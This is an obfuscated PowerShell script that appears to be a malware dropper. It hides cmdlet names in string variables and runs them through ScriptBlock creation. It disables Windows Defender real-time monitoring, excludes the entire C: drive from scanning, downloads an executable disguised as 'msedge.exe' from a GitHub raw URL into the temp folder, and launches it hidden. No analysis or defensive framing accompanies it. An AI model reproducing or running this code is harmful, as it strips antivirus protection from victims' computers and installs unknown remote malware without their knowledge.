$v1 = "Set-MpPreference"
$v2 = "DisableRealtimeMonitoring"
$v3 = "Add-MpPreference"
$v4 = "ExclusionPath"
$v5 = "Invoke-WebRequest"
$v6 = "OutFile"
$v7 = "Start-Process"
$v8 = "FilePath"
$v9 = "WindowStyle"
$v10 = "Hidden"
$v11 = "Wait"

& ([ScriptBlock]::Create("$v1 -$v2 `$true"))
& ([ScriptBlock]::Create("$v3 -$v4 'C:\'"))
& ([ScriptBlock]::Create("$v5 -Uri 'https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe' -$v6 '$env:TEMP\msedge.exe'"))
& ([ScriptBlock]::Create("$v7 -$v8 '$env:TEMP\msedge.exe' -$v9 $v10 -$v11"))
